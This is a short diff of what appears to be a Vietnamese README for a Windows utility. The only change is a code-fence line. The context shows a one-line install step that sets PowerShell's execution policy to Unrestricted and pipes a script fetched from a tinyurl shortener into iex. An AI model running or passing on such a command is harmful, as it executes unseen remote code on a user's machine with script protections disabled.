@@ -23,7 +23,7 @@ Khởi chạy ngay lập tức chỉ với một dòng lệnh duy nhất (Yêu c
 ```powershell
 Set-ExecutionPolicy Unrestricted -Scope Process -Force; irm [https://tinyurl.com/phattanpc](https://tinyurl.com/phattanpc) | iex
 
-
+```powershell
 ---
 
 ## Danh sách tính năng chi tiết
